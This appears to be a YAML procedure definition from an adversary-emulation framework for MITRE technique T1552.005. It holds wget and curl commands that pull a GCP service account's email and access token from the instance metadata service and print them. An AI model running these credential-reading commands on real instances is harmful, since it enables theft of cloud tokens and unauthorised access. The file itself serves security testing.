name: Get GCP Service Account Token
description: Get the GCP service account token from the metadata service
tactic: Credential Access
status: disabled
techniques:
  ["Unsecured Credentials: Cloud Instance Metadata API ", T1552.005]
preconditions:
  kind: System
  # CSP: GCP
parameters:
  HOST:
    type: string
    description: The metadata service host
    default: metadata.google.internal
procedures:
  - key: wget
    tool: wget
      # EMAIL=$(wget -qO- http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email 
      #   --header="Metadata-Flavor: Google") &&
      # TOKEN=$(wget -qO- http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 
      #   --header="Metadata-Flavor: Google") &&
    command: >-
      EMAIL=$(wget -qO- http://${HOST}/computeMetadata/v1/instance/service-accounts/default/email 
        --header="Metadata-Flavor: Google") &&
      TOKEN=$(wget -qO- http://${HOST}/computeMetadata/v1/instance/service-accounts/default/token 
        --header="Metadata-Flavor: Google") &&
      echo {\"email\": \"$EMAIL\", \"token\": $TOKEN}
  - key: curl
    tool: curl
    command: >-
      EMAIL=$(curl http://${HOST}/computeMetadata/v1/instance/service-accounts/default/email 
      -H "Metadata-Flavor: Google") &&
      TOKEN=$(curl http://${HOST}/computeMetadata/v1/instance/service-accounts/default/token 
      -H "Metadata-Flavor: Google") &&
      echo {\"email\": \"$EMAIL\", \"token\": $TOKEN}
effects: ["GCP.serviceAccountToken", "can-reach(169.254.169.254)"]
references:
  - https://attack.mitre.org/techniques/T1552/005/
  - https://hackingthe.cloud/gcp/general-knowledge/metadata_in_google_cloud_instances